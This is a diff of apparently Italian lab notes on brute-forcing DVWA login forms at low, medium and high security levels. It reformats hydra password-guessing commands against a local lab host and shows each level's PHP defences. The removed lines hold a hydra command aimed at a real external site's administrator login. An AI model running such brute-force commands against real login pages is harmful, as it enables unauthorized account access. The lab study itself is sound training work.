@@ -4,12 +4,6 @@
 - http://www.symantec.com/connect/articles/password-crackers-ensuring-security-your-password
 - http://www.sillychicken.co.nz/Security/how-to-brute-force-http-forms-in-windows.html
 
-<!--
-NOTES
-hydra -l hydra -P password.lst -s 80 -f www.sillychicken.co.nz http-post-form "/administrator/index.php:usrname=^USER^&pass=^PASS^&submit=Login:Incorrect Username"
--f Exits the program after the first match is made
--->
-
 ### Brute force - Low
 
 Exploit:
@@ -18,14 +12,20 @@ Exploit:
 
 - lancia:
 
-	`$ hydra -l admin -P rockyou.txt 172.17.0.2 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=$1; security=low"`
+```
+$ hydra -l admin -P rockyou.txt \
+	172.17.0.2 http-get-form \
+	"/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=$1; security=low"
+```
 
-	parametri http-get-form: `"<RELATIVE PATH>:<PARAMETERS>:<FAILED LOGIN TEXT>:H=Cookie: <REQUEST COOKIES>"`
+parametri http-get-form: `"<RELATIVE PATH>:<PARAMETERS>:<FAILED LOGIN TEXT>:H=Cookie: <REQUEST COOKIES>"`
 
 ### Brute force - Medium
 
-	// Login failed
-        sleep( 2 );
+```
+// Login failed
+sleep( 2 );
+```
 
 Exploit:
 
@@ -33,17 +33,24 @@ Exploit:
 
 - lancia:
 
-	`$ hydra -l admin -P rockyou.txt localhost http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=$1; security=medium" -c 3 -t 1`
+```
+$ hydra -l admin -P rockyou.txt \
+	localhost http-get-form \
+	"/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=$1; security=medium" \
+	-c 3 -t 1
+```
 
 ### Brute force - High
 
-	// Check Anti-CSRF token
-	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
+```
+// Check Anti-CSRF token
+checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
 
-	...
+...
 
-    // Login failed
-    sleep( rand( 0, 3 ) );
+// Login failed
+sleep( rand( 0, 3 ) );
+```
 
 Exploit:
 
